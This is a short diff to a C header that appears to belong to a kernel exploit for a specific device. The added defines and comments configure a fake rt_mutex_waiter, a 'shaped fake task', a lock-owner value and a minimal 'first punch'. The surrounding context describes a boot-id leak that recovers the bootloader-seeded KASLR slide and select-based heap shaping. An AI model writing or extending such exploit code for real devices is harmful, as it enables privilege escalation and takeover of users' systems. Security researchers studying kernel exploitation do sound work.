@@ -292,6 +292,14 @@
 #define SLIDE_PSELECT_NFDS 320
 #define SLIDE_USE_SELECT 1
 
+/* R201 BTF reports the pre-split 0x58 rt_mutex_waiter. The app's boot-id
+ * route must use the shaped fake task, but keep the first punch minimal until
+ * its store is confirmed; rb-parent restoration is intentionally separate. */
+#define SLIDE_FAKE_WAITER_PRIO 0
+#define SLIDE_WAITER_WAKE_STATE 0
+#define SLIDE_USE_FAKE_TASK 1
+#define SLIDE_LOCK_OWNER_VALUE 1ULL
+
 /* Bootloader-seeded KASLR: the slide is gigabytes, 2 MiB aligned, and moves
  * only the virtual mapping.  Measured on this device: the boot-id leak sees a
  * multi-GB, 0x200000-aligned slide (e.g. 0x18b8400000) on every boot, and the
